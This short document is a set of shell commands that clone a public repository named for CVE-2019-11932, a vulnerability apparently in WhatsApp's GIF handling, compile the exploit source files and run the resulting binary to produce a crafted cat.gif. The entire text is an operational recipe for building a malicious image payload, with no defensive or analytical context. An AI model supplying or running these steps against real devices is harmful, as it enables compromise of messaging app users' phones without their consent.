git clone https://github.com/awakened1712/CVE-2019-11932 
cd CVE-2019-11932
gcc -o exploit egif_lib.c exploit.c
./exploit /root/Desktop/cat.gif
